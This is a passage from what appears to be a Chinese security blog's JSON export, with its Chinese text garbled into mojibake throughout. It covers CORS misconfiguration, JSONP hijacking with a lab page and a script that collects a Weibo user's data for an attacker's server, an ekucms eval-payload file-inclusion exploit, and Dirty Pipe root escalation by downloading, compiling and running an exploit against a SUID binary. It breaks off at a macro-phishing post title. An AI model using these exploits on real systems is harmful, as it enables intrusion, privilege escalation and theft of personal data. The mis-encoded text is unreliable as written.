å¤´éƒ¨çš„å€¼ï¼š æˆ‘ä»¬çš„æ¡ä»¶å¯ä»¥æ˜¯å¦‚ä¸‹ï¼š Access-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true æ£€æµ‹æ•ˆæœå¦‚ä¸‹ï¼š ã€æ³¨æ„ã€‘è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æµ‹è¯•ä¸‹å¸¦æœ‰ CORS å­—æ®µçš„ç½‘ç«™æ˜¯å¦æœ‰ CORS æ¼æ´ï¼Œå¦‚æœæœåŠ¡å™¨å“åº”åŒ…çš„è¯·æ±‚å¤´æ˜¯ä»¥ä¸‹å‡ ç§æƒ…å†µåˆ™å¯å­˜åœ¨ CORS æ¼æ´ï¼š å®é”¤å­˜åœ¨ï¼š æœ‰ä¸”ä»…æœ‰å¦‚ä¸‹è¯·æ±‚å¤´ï¼š Access-Control-Allow-Origin: * å®é”¤å­˜åœ¨ï¼šåŒæ—¶å­˜åœ¨å¦‚ä¸‹ä¸¤ä¸ªè¯·æ±‚å¤´ Access-Control-Allow-Origin: https://attacker.comAccess-Control-Allow-Credentials: true å¯èƒ½å­˜åœ¨ï¼šåŒæ—¶å­˜åœ¨å¦‚ä¸‹ä¸¤ä¸ªè¯·æ±‚å¤´ Access-Control-Allow-Origin: nullAccess-Control-Allow-Credentials: true ä½†æ˜¯å¦‚æœæ˜¯å¦‚ä¸‹ç»„åˆï¼Œåˆ™ç»å¯¹æ²¡æœ‰æ¼æ´ï¼Œå› ä¸ºè¯¥é…ç½®ä¸‹æµè§ˆå™¨ä¼šè‡ªåŠ¨é˜»æ­¢ï¼š Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true 6ã€ç»“åˆXSSæœ‰æ—¶å€™ CORS é…ç½®äº†ä¿¡ä»»è‡ªèº«çš„ä»»æ„å­åŸŸï¼Œé‚£ä¹ˆå¦‚æœä¸€ä¸ªå­åŸŸå­˜åœ¨ XSS æ¼æ´å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´å»è¯»å–å…¶ä»–å­åŸŸçš„èµ„æºï¼Œç±»ä¼¼çš„åœºæ™¯è¿˜æœ‰æ¯”å¦‚ HTTPS åŸŸä¿¡ä»» HTTP åŸŸç­‰ã€‚ 7ã€æ¼æ´æ‰«æå¯ä»¥ä½¿ç”¨ Xray è”åŠ¨ BurpSuite è¿›è¡Œæ‰«æï¼Œå¦‚ä¸‹æ˜¯ Xray æ‰«å‡ºæ¥çš„ä¸€æ¬¡ CORSï¼š åŒæ—¶ githubä¸Š æä¾›äº†ä¸€ä¸ªå…³äºæ‰«æ CORS é…ç½®æ¼æ´çš„è„šæœ¬ï¼Œhttps://github.com/chenjj/CORScannerã€‚ root@kali:~/Desktop/CORScanner# python cors_scan.py -husage: cors_scan.py [-h] [-u URL] [-i INPUT] [-t THREADS] [-o OUTPUT] [-v [VERBOSE]] [-d [HEADERS [HEADERS ...]]] OPTIONS: -h, --help show this help message and exit -u URL, --url URL URL/domain to check it&#x27;s CORS policy -i INPUT, --input INPUT URL/domain list file to check their CORS policy -t THREADS, --threads THREADS Number of threads to use for CORS scan -o OUTPUT, --output OUTPUT Save the results to text file -v [VERBOSE], --verbose [VERBOSE] Enable Verbosity and display results in realtime -d [HEADERS [HEADERS ...]], --headers [HEADERS [HEADERS ...]] Add headers to the request. Example: python cors_scan.py -u google.com æˆ‘ä»¬å°†æ£€æµ‹çš„åŸŸåå†™åœ¨ä¸€ä¸ªè®°äº‹æœ¬é‡Œï¼Œç„¶åä½¿ç”¨-iå‚æ•°å»è¿›è¡Œæ‰¹é‡æ‰«æã€‚ 8ã€é˜²æŠ¤æ–¹æ¡ˆ å…³é—­ä¸å¿…è¦å¼€å¯çš„CORSï¼› ç™½åå•é™åˆ¶ï¼šå®šä¹‰â€œæºâ€çš„ç™½åå•ï¼Œé¿å…ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸è¦é…ç½® Access-Control-Allow-Origin ä¸ºé€šé…ç¬¦ * æˆ– null ï¼Œä¸¥æ ¼æ•ˆéªŒæ¥è‡ªè¯·æ±‚æ•°æ®åŒ…ä¸­çš„ Origin çš„å€¼ï¼› ä»…å…è®¸ä½¿ç”¨å®‰å…¨åè®®ï¼Œé¿å…ä¸­é—´äººæ”»å‡»ï¼› å°½å¯èƒ½çš„è¿”å› Vary: Origin å¤´éƒ¨ï¼Œä»¥é¿å…æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨ç¼“å­˜è¿›è¡Œæ”»å‡»ï¼› é¿å…å°† Access-Control-Allow-Credentials æ ‡å¤´è®¾ç½®ä¸ºé»˜è®¤å€¼ true ï¼Œè·¨åŸŸè¯·æ±‚è‹¥ä¸å­˜åœ¨å¿…è¦çš„å‡­è¯æ•°æ®ï¼Œåˆ™æ ¹æ®å®é™…æƒ…å†µå°†å…¶è®¾ç½®ä¸º falseï¼› é™åˆ¶è·¨åŸŸè¯·æ±‚å…è®¸çš„æ–¹æ³•ï¼ŒAccess-Control-Allow-Methods æœ€å¤§é™åº¦åœ°å‡å°‘æ‰€æ¶‰åŠçš„æ–¹æ³•ï¼Œé™ä½é£é™©ï¼› é™åˆ¶æµè§ˆå™¨ç¼“å­˜æœŸé™ï¼šå»ºè®®é€šè¿‡ Access-Control-Allow-Methods å’Œ Access-Control-Allow-Headers å¤´éƒ¨ï¼Œé™åˆ¶æµè§ˆå™¨ç¼“å­˜ä¿¡æ¯çš„æ—¶é—´ã€‚é€šè¿‡é…ç½® Access-Control-Max-Age æ ‡å¤´æ¥å®Œæˆï¼Œè¯¥å¤´éƒ¨æ¥æ”¶æ—¶é—´æ•°ä½œä¸ºè¾“å…¥ï¼Œè¯¥æ•°å­—æ˜¯æµè§ˆå™¨ä¿å­˜ç¼“å­˜çš„æ—¶é—´ã€‚é…ç½®ç›¸å¯¹è¾ƒä½çš„å€¼ï¼Œç¡®ä¿æµè§ˆå™¨åœ¨çŸ­æ—¶é—´å†…å¯ä»¥æ›´æ–°ç­–ç•¥ï¼› ä»…åœ¨æ¥æ”¶åˆ°è·¨åŸŸè¯·æ±‚æ—¶æ‰é…ç½®æœ‰å…³äºè·¨åŸŸçš„å¤´éƒ¨ï¼Œå¹¶ç¡®ä¿è·¨åŸŸè¯·æ±‚æ˜¯åˆæ³•çš„æºï¼Œä»¥å‡å°‘æ”»å‡»è€…æ¶æ„åˆ©ç”¨çš„å¯èƒ½æ€§ã€‚ ä¸‰ã€JSONPåŠ«æŒJSONP å…¨ç§°æ˜¯ JSON with Padding ï¼Œæ˜¯åŸºäº JSON æ ¼å¼çš„ä¸ºè§£å†³è·¨åŸŸè¯·æ±‚èµ„æºè€Œäº§ç”Ÿçš„è§£å†³æ–¹æ¡ˆï¼Œå®ƒæ˜¯ json çš„ä¸€ç§â€œä½¿ç”¨æ¨¡å¼â€ï¼Œå¯ä»¥è®©ç½‘é¡µä»åˆ«çš„åŸŸåï¼ˆç½‘ç«™ï¼‰é‚£è·å–èµ„æ–™ï¼Œå³è·¨åŸŸè¯»å–æ•°æ®ã€‚ JSONP å®ç°çš„åŸºæœ¬åŸç†æ˜¯åˆ©ç”¨äº† HTML é‡Œ &lt;script&gt;&lt;/script&gt; å…ƒç´ æ ‡ç­¾ï¼Œè¿œç¨‹è°ƒç”¨ JSON æ–‡ä»¶æ¥å®ç°æ•°æ®ä¼ é€’ã€‚å½“æŸç½‘ç«™é€šè¿‡ JSONP çš„æ–¹å¼æ¥è·¨åŸŸï¼ˆä¸€èˆ¬ä¸ºå­åŸŸï¼‰ä¼ é€’ç”¨æˆ·è®¤è¯åçš„æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ JSONP è°ƒç”¨é¡µé¢ï¼Œè¯±å¯¼è¢«æ”»å‡»è€…è®¿é—®æ¥è¾¾åˆ°æˆªå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯çš„ç›®çš„ã€‚ 1ã€åˆ©ç”¨è¿‡ç¨‹ ç”¨æˆ·åœ¨ç½‘ç«™B æ³¨å†Œå¹¶ç™»å½•ï¼Œç½‘ç«™B åŒ…å«äº†ç”¨æˆ·çš„idï¼Œnameï¼Œemailç­‰ä¿¡æ¯ï¼› ç”¨æˆ·é€šè¿‡æµè§ˆå™¨å‘ç½‘ç«™Aå‘å‡ºURLè¯·æ±‚ï¼› ç½‘ç«™Aå‘ç”¨æˆ·è¿”å›å“åº”é¡µé¢ï¼Œå“åº”é¡µé¢ä¸­æ³¨å†Œäº† JavaScript çš„å›è°ƒå‡½æ•°å’Œå‘ç½‘ç«™Bè¯·æ±‚çš„ script æ ‡ç­¾ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š &lt;script type=&quot;text/javascript&quot;&gt;function Callback(result)&#123; alert(result.name);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt; ç”¨æˆ·æ”¶åˆ°å“åº”ï¼Œè§£æ JS ä»£ç ï¼Œå°†å›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°å‘ç½‘ç«™Bå‘å‡ºè¯·æ±‚ï¼› ç½‘ç«™ B æ¥æ”¶åˆ°è¯·æ±‚åï¼Œè§£æè¯·æ±‚çš„ URLï¼Œä»¥ JSON æ ¼å¼ç”Ÿæˆè¯·æ±‚éœ€è¦çš„æ•°æ®ï¼Œå°†å°è£…çš„åŒ…å«ç”¨æˆ·ä¿¡æ¯çš„ JSON æ•°æ®ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°è¿”å›ç»™æµè§ˆå™¨ï¼Œç½‘ç«™Bè¿”å›çš„æ•°æ®å®ä¾‹å¦‚ä¸‹ï¼š Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;) ç½‘ç«™Bæ•°æ®è¿”å›åï¼Œæµè§ˆå™¨åˆ™è‡ªåŠ¨æ‰§è¡Œ Callback å‡½æ•°å¯¹æ­¥éª¤4è¿”å›çš„ JSON æ ¼å¼æ•°æ®è¿›è¡Œå¤„ç†ï¼Œé€šè¿‡ alert å¼¹çª—å±•ç¤ºäº†ç”¨æˆ·åœ¨ç½‘ç«™Bçš„æ³¨å†Œä¿¡æ¯ã€‚å¦å¤–ä¹Ÿå¯å°† JSON æ•°æ®å›ä¼ åˆ°ç½‘ç«™Açš„æœåŠ¡å™¨ï¼Œè¿™æ ·ç½‘ç«™Aåˆ©ç”¨ç½‘ç«™Bçš„JSONPæ¼æ´ä¾¿è·å–åˆ°äº†ç”¨æˆ·åœ¨ç½‘ç«™Bæ³¨å†Œçš„ä¿¡æ¯ã€‚ 2ã€é¶åœºå®ä¾‹ä¸‹é¢ä»¥ DoraBox é¶åœºçš„ JSONP åŠ«æŒæ¼æ´ä¸ºæ¼”ç¤ºæ¡ˆä¾‹ï¼š è®¿é—® JSONP é¶åœºç¯å¢ƒé¡µé¢ï¼š å…¶æœåŠ¡ç«¯æºç å¦‚ä¸‹ï¼š &lt;!-- jsonp.php --&gt;&lt;?php include &quot;../class/function.class.php&quot;; $reqMethod = &quot;GET&quot;; $reqValue = &quot;callback&quot;; $p = new Func($reqMethod, $reqValue); $info = array(&#x27;username&#x27; =&gt; &#x27;Vulkey_Chen&#x27;, &#x27;mobilephone&#x27; =&gt; &#x27;13188888888&#x27;, &#x27;email&#x27; =&gt; &#x27;admin@gh0st.cn&#x27;, &#x27;address&#x27; =&gt; &#x27;ä¸­åäººæ°‘å…±å’Œå›½&#x27;, &#x27;**&#x27; =&gt; &#x27;Cool Man&#x27;); if(!@$_GET[&#x27;callback&#x27;])&#123; echo $p -&gt; con_function(&#x27;json_encode&#x27;,$info); &#125;else&#123; $callback = htmlspecialchars($_GET[&#x27;callback&#x27;]); echo &quot;&#123;$callback&#125;(&quot; . $p -&gt; con_function(&#x27;json_encode&#x27;,$info) . &quot;)&quot;; &#125;?&gt; é‡ç‚¹å…³æ³¨ï¼š if(!@$_GET[&#x27;callback&#x27;])&#123; echo $p -&gt; con_function(&#x27;json_encode&#x27;,$info);&#125;else&#123; $callback = htmlspecialchars($_GET[&#x27;callback&#x27;]); echo &quot;&#123;$callback&#125;(&quot; . $p -&gt; con_function(&#x27;json_encode&#x27;,$info) . &quot;)&quot;; &#125; è¿™é‡Œé¦–å…ˆä»¥ get å½¢å¼æ¥æ”¶åˆ° callback çš„å€¼ï¼Œå¦‚æœ callback ä¸ºç©ºï¼Œåˆ™å¿½ç•¥è­¦å‘Šè¾“å‡º info çš„ json æ ¼å¼æ•°æ®ï¼š å¦‚æœ callback å€¼ä¸ä¸ºç©ºï¼Œåˆ™å¯¹è¿™ä¸ªå€¼åšä¸€ä¸ªè¿‡æ»¤åè¾“å‡ºï¼Œç„¶ååé¢è¿˜æ˜¯è¾“å‡º json æ ¼å¼çš„ info çš„å€¼ï¼š ä»è¿™æ®µä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œcallback çš„å€¼æ˜¯å¯ä»¥åŠ¨æ€è¾“å‡ºçš„ï¼Œå¦‚æœæˆ‘ä»¬ç°åœ¨æ‹¿åˆ°äº†ä¸€ä¸ªä»¥jsonp æ–¹å¼ä¼ è¾“ç”¨æˆ·è®¤è¯åæ•°æ®çš„ç½‘ç«™ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªæ¶æ„çš„ jsonp è°ƒç”¨é¡µé¢ï¼Œç„¶åè¯±ä½¿ç”¨æˆ·è®¿é—®æˆ‘ä»¬çš„é¡µé¢ï¼Œä»è€Œè¾¾åˆ°ä¸€ä¸ªæˆªå–ç”¨æˆ·ä¿¡æ¯çš„ç›®çš„ã€‚ &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;JSONPåŠ«æŒæµ‹è¯•&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;function test(result) &#123; alert(result.mobilephone); &#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/DoraBox-master/csrf/jsonp.php?callback=test&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; å°†ä¸Šé¢çš„ jsonp_attack.html é¡µé¢æ”¾åœ¨æœ¬åœ° phpstudy æ­å»ºçš„æœåŠ¡ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œæµè§ˆå™¨è¿›è¡Œè®¿é—®ï¼ŒæˆåŠŸè·å¾—æ•æ„Ÿä¿¡æ¯ï¼ˆæ‰‹æœºå·ç ï¼‰ï¼š 3ã€æ¼æ´æŒ–æ˜ æœç´¢å¼•æ“ Hacking è¯­æ³•â€”â€”site:target.com inurl:?callback æµè§ˆå™¨-è°ƒè¯•-æœç´¢å…³é”®å­—ï¼ˆjson/jsonp/callbackï¼‰ï¼š 4ã€JSONPæ¼æ´åˆ©ç”¨æŠ€å·§JSONP æ¼æ´ä¸»è¦è¢«æ”»å‡»è€…ç”¨æ¥åœ¨å—å®³è€…ä¸çŸ¥ä¸è§‰ä¸­çªƒå–ä»–ä»¬çš„éšç§æ•°æ®ï¼Œå¸¸å¸¸è¢«ä¸€äº› APT ç»„ç»‡é‡‡ç”¨è¿›è¡Œä¿¡æ¯æ”¶é›†å’Œé’“é±¼çš„å·¥ä½œ( æ°´å‘æ”»å‡» )ï¼Œä¸‹é¢çš„ä¸€ä¸ªä¾‹å­å°±å¯ä»¥è¯´æ˜¯åœ¨æ¨¡æ‹Ÿæ°´å‘æ”»å‡» å½“æˆ‘ä»¬å‘ç°ä¿¡æ¯æ³„éœ²çš„ jsonp æ¥å£ä»¥åæˆ‘ä»¬è¦åšçš„å°±æ˜¯åœ¨è‡ªå·±çš„ç½‘ç«™ä¸Šå†™ä¸€ä¸ªè„šæœ¬ï¼Œç„¶åå¼•è¯±å—å®³è€…å»è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œä¸€æ—¦è®¿é—®äº†è¿™ä¸ªç½‘ç«™ï¼Œè„šæœ¬å°±ä¼šè‡ªåŠ¨è¿è¡Œï¼Œå°±ä¼šæƒ³è¿™ä¸ªæ¥å£è¯·æ±‚ç”¨æˆ·çš„æ•æ„Ÿæ•°æ®ï¼Œå¹¶ä¼ é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Š $.ajax(&#123; url: &#x27;https://api.weibo.com/2/&#123;éšè—äº†å“¦&#125;&#x27;, type: &#x27;get&#x27;, dataType: &#x27;jsonp&#x27;,&#125;).done(function(json)&#123; var id = json[&quot;data&quot;][&quot;id&quot;]; var screen_name = json[&quot;data&quot;][&quot;screen_name&quot;]; var profile_image_url = json[&quot;data&quot;][&quot;profile_image_url&quot;]; var post_data = &quot;&quot;; post_data += &quot;id=&quot; + id + &quot;&amp;&quot;; post_data += &quot;screen_name=&quot; + screen_name + &quot;&amp;&quot;; post_data += &quot;profile_image_url=&quot; + encodeURIComponent(profile_image_url); console.log(post_data); // å‘é€åˆ°æˆ‘çš„æœåŠ¡å™¨ä¸Š&#125;).fail(function() &#123;&#125;); æ—¢ç„¶æ˜¯çªƒå–æ•æ„Ÿä¿¡æ¯ï¼Œé‚£ä¹ˆæ•æ„Ÿä¿¡æ¯é™¤äº†ä¸€äº› email æ‰‹æœºå· ç”¨æˆ·åç­‰è¿˜æœ‰ä»€ä¹ˆå‘¢ï¼Ÿæ²¡é”™ï¼Œç”šè‡³å¯ä»¥æ˜¯ CSRF Token ä¿¡æ¯ï¼Œæœ‰æ—¶å€™åœ¨ CSRF token è·å–ä¸åˆ°ä½†æ˜¯åˆæ‰¾ä¸åˆ° XSS çš„æ”»å‡»ç‚¹çš„æ—¶å€™ä¸å¦¨è€ƒè™‘ä¸€ä¸‹ jsonp åŠ«æŒã€‚ 5ã€æ¼æ´å±å®³JSONPæ˜¯ä¸€ç§æ•æ„Ÿä¿¡æ¯æ³„éœ²çš„æ¼æ´ï¼Œç»è¿‡æ”»å‡»è€…å·§å¦™è€ŒæŒä¹…åœ°åˆ©ç”¨ï¼Œä¼šå¯¹ä¼ä¸šå’Œç”¨æˆ·é€ æˆå·¨å¤§çš„å±å®³ã€‚æ”»å‡»è€…é€šè¿‡å·§å¦™è®¾è®¡ä¸€ä¸ªç½‘ç«™ï¼Œ ç½‘ç«™ä¸­åŒ…å«å…¶ä»–ç½‘ç«™çš„JSONPæ¼æ´åˆ©ç”¨ä»£ç  ï¼Œå°†é“¾æ¥é€šè¿‡é‚®ä»¶ç­‰å½¢å¼æ¨é€ç»™å—å®³äººï¼Œ å¦‚æœå—å®³è€…ç‚¹å‡»äº†é“¾æ¥ï¼Œåˆ™æ”»å‡»è€…ä¾¿å¯ä»¥è·å–å—å®³è€…çš„ä¸ªäººçš„ä¿¡æ¯ï¼Œå¦‚é‚®ç®±ã€å§“åã€æ‰‹æœºç­‰ä¿¡æ¯ï¼Œ è¿™äº›ä¿¡æ¯å¯ä»¥è¢«è¿æ³•çŠ¯ç½ªåˆ†å­ç”¨ä½œâ€œç²¾å‡†è¯ˆéª—â€ã€‚å¯¹æ–¹æŒæ¡çš„ä¸ªäººä¿¡æ¯è¶Šå¤šï¼Œè¶Šå®¹æ˜“å–å¾—å—å®³äººçš„ä¿¡ä»»ï¼Œè¯ˆéª—æ´»åŠ¨è¶Šå®¹æ˜“æˆåŠŸï¼Œç»™å—å®³äººå¸¦æ¥çš„è´¢äº§æŸå¤±ä»¥åŠç¤¾ä¼šå±å®³ä¹Ÿå°±è¶Šå¤§ã€‚ 6ã€é˜²æŠ¤æ–¹æ¡ˆ ä¸¥æ ¼å®‰å…¨çš„å®ç° CSRF æ–¹å¼è°ƒç”¨ JSON æ–‡ä»¶ï¼šé™åˆ¶ Referer ã€éƒ¨ç½²ä¸€æ¬¡æ€§ Token ç­‰ã€‚ ä¸¥æ ¼å®‰è£… JSON æ ¼å¼æ ‡å‡†è¾“å‡º Content-Type åŠç¼–ç ï¼ˆ Content-Type : application/json; charset=utf-8 ï¼‰ã€‚ ä¸¥æ ¼è¿‡æ»¤ callback å‡½æ•°ååŠ JSON é‡Œæ•°æ®çš„è¾“å‡ºã€‚ ä¸¥æ ¼é™åˆ¶å¯¹ JSONP è¾“å‡º callback å‡½æ•°åçš„é•¿åº¦(å¦‚é˜²å¾¡ä¸Šé¢ flash è¾“å‡ºçš„æ–¹æ³•)ã€‚ å…¶ä»–ä¸€äº›æ¯”è¾ƒâ€œçŒ¥çâ€çš„æ–¹æ³•ï¼šå¦‚åœ¨ Callback è¾“å‡ºä¹‹å‰åŠ å…¥å…¶ä»–å­—ç¬¦(å¦‚ï¼š/**/ã€å›è½¦æ¢è¡Œ)è¿™æ ·ä¸å½±å“ JSON æ–‡ä»¶åŠ è½½ï¼Œåˆèƒ½ä¸€å®šç¨‹åº¦é¢„é˜²å…¶ä»–æ–‡ä»¶æ ¼å¼çš„è¾“å‡ºã€‚è¿˜æ¯”å¦‚ Gmail æ—©èµ·ä½¿ç”¨ AJAX çš„æ–¹å¼è·å– JSON ï¼Œå¬è¿‡åœ¨è¾“å‡º JSON ä¹‹å‰åŠ å…¥ while(1) ;è¿™æ ·çš„ä»£ç æ¥é˜²æ­¢ JS è¿œç¨‹è°ƒç”¨ã€‚ å››ã€CORSä¸JSONPçš„æ¯”è¾ƒCORSä¸JSONPçš„ä½¿ç”¨ç›®çš„ç›¸åŒï¼Œä½†æ˜¯æ¯”JSONPæ›´å¼ºå¤§ã€‚ JSONPåªæ”¯æŒGETè¯·æ±‚ï¼ŒCORSæ”¯æŒæ‰€æœ‰ç±»å‹çš„HTTPè¯·æ±‚ã€‚JSONPçš„ä¼˜åŠ¿åœ¨äºæ”¯æŒè€å¼æµè§ˆå™¨ï¼Œä»¥åŠå¯ä»¥å‘ä¸æ”¯æŒCORSçš„ç½‘ç«™è¯·æ±‚æ•°æ®ã€‚ äº”ã€å‚è€ƒé“¾æ¥ https://blog.csdn.net/weixin_39190897/article/details/113769462 https://www.cnblogs.com/happystudyhuan/p/11583384.html https://ruanyifeng.com/blog/2016/04/cors.html","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"CSRF","slug":"CSRF","permalink":"https://wolke.cn/tags/CSRF/"}],"author":"w01ke"},{"title":"æ˜“é…·ekucmsæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´","slug":"æ˜“é…·ekucmsæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´","date":"2022-03-09T04:57:30.000Z","updated":"2022-10-23T13:56:51.301Z","comments":true,"path":"post/28755b24.html","link":"","permalink":"https://wolke.cn/post/28755b24.html","excerpt":"","text":"ä¸€ã€ç®€ä»‹æ˜“é…·CMSæ˜¯ä¸€å¥—ä¸“ä¸ºä¸åŒéœ€æ±‚çš„ç«™é•¿è€Œè®¾è®¡çš„è§†é¢‘ç‚¹æ’­ç³»ç»Ÿï¼Œçµæ´»ï¼Œæ–¹ä¾¿æ˜¯æœ€å¤§çš„ç‰¹è‰²ï¼Œä¸ºåˆå­¦è€…å¿«é€Ÿæ¶è®¾ç½‘ç«™é¦–é€‰ï¼Œåªéœ€5åˆ†é’Ÿå³å¯å»ºç«‹ä¸€ä¸ªæµ·é‡çš„è§†é¢‘è®¯æ¯çš„è¡Œä¸šç½‘ç«™ã€‚ æ˜“é…·CMSé‡‡ç”¨PHP+MYSQLæ¶æ„ äºŒã€æ¼æ´å½±å“èŒƒå›´ekucms &lt;= 2.5 ä¸‰ã€æµ‹è¯•ç¯å¢ƒ PHP 5.3.21 MySQL 5.7.26 ekucms 2.4.1 å››ã€å¤ç°ä¸‹è½½åœ°å€ï¼šé“¾æ¥ï¼šhttps://pan.baidu.com/s/1TkJgH7WFHLb781NO_2Ysag æå–ç ï¼šnfzt å®‰è£…å®Œæˆåå¦‚å›¾æ‰€ç¤º è®¿é—®URLï¼šhttp://localhost/ekucms2.4.1/?s=my/show/id/&#123;~eval($_POST[x])&#125;ï¼ŒæŠ¥é”™ æŠ¥é”™ä¿¡æ¯è®°å½•åˆ°äº†æ—¥å¿—ï¼Œæ—¥å¿—ç›®å½•ï¼š/ekucms/temp/Logs/ æ–‡ä»¶åŒ…å«æ—¥å¿—è·¯å¾„ï¼šhttp://localhost/ekucms2.4.1/?s=my/show/id//../temp/logs/22_03_08.log POSTï¼šx=phpinfo();","categories":[{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CMS","slug":"CMS","permalink":"https://wolke.cn/tags/CMS/"}],"author":"w01ke"},{"title":"CVE-2022-0847 Linuxè„ç®¡å†…æ ¸ææƒæ¼æ´å¤ç°","slug":"CVE-2022-0847-Linuxå†…æ ¸ææƒæ¼æ´å¤ç°","date":"2022-03-09T02:47:13.000Z","updated":"2022-03-10T11:01:13.825Z","comments":true,"path":"post/77a28503.html","link":"","permalink":"https://wolke.cn/post/77a28503.html","excerpt":"","text":"ä¸€ã€CVE-2022-0847ç®€ä»‹å±å®³ç­‰çº§ï¼šé«˜ POC/EXPæƒ…å†µï¼šå·²å…¬å¼€ï¼ˆhttps://www.exploit-db.com/exploits/50808ï¼‰ å½±å“èŒƒå›´ï¼šLinuxå†…æ ¸5.8åŠä»¥åçš„ç‰ˆæœ¬ï¼ˆæ³¨ï¼šè¯¥æ¼æ´å·²åœ¨Linux 5.16.11ã€5.15.25 å’Œ 5.10.102 ä¸­ä¿®å¤ï¼‰ äºŒã€æ¼æ´æè¿°CVE-2022-0847æ˜¯è‡ª 5.8 ä»¥æ¥ Linux å†…æ ¸ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥è¦†ç›–ä»»æ„åªè¯»æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚è¿™æ ·å°†æ™®é€šçš„æƒé™æå‡è‡³rootæƒé™ï¼Œå› ä¸ºéç‰¹æƒè¿›ç¨‹å¯ä»¥å°†ä»£ç æ³¨å…¥åˆ°æ ¹è¿›ç¨‹ã€‚ CVE-2022-0847ç±»ä¼¼äº CVE-2016-5195 â€œDirty Cowâ€ï¼ˆè„ç‰›ææƒï¼‰ï¼Œè€Œä¸”å®¹æ˜“è¢«åˆ©ç”¨ï¼Œç½‘é¡µç¿»è¯‘è¿‡æ¥å«è„ç®¡é“ã€‚ ä¸‰ã€å¤ç°ã€æ–¹æ³•ä¸€ï¼šä½¿ç”¨DirtyPipe.shã€‘ git clone https://github.com/imfiver/CVE-2022-0847cd CVE-2022-0847id # æŸ¥çœ‹å½“å‰ç”¨æˆ·id,ç¡®å®šä¸ºæ™®é€šç”¨æˆ·ï¼Œéœ€è¦æå‡æƒé™uname -a # æŸ¥çœ‹å½“å‰å†…æ ¸ç‰ˆæœ¬ï¼Œ5.10.0å¤§äºç­‰äº5.8ç¬¦åˆæœ¬æ¬¡æ¼æ´åˆ©ç”¨å‰æbash ./Dirty-Pipe.sh ã€æ–¹æ³•äºŒï¼šä½¿ç”¨dirtypipez.cã€‘ mkdir dirtypipezcd dirtypipezwget https://haxx.in/files/dirtypipez.cgcc dirtypipez.c -o dirtypipez è¿™ä¸ªPOCéœ€è¦äº‹å…ˆæ‰¾åˆ°ä¸€ä¸ªå…·æœ‰SUIDæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªæ–‡ä»¶è¿›è¡Œææƒã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°è¿™ç±»æ–‡ä»¶ find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -print 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; è¿™é‡Œå°±ä»¥/usr/bin/suä¸ºä¾‹ï¼Œç›´æ¥./dirtypipezè·Ÿä¸Šå…·æœ‰SUIDæƒé™çš„æ–‡ä»¶å³å¯ææƒ ./dirtypipez /usr/bin/su å››ã€æ¼æ´ä¿®å¤æ›´æ–°å‡çº§Linuxå†…æ ¸åˆ°ä»¥ä¸‹å®‰å…¨ç‰ˆæœ¬ Linuxå†…æ ¸ &gt;= 5.16.11 Linuxå†…æ ¸ &gt;= 5.15.25 Linuxå†…æ ¸ &gt;= 5.10.102 äº”ã€å‚è€ƒé“¾æ¥ https://mp.weixin.qq.com/s/6VebZCKAv6kkmQme4GCQ_w","categories":[{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"}],"author":"w01ke"},{"title":"Wordå®é’“é±¼","slug":"Wordå®é’“é±¼","date":"2022-03-08T07:16:05.000Z","updated":"2022-03-08T08:45:15.220Z","comments":true,"path":"post/42739bea.html","link":"","permalink":"https://wolke.cn/post/42739bea.html","excerpt":"","text":"ä¸€ã€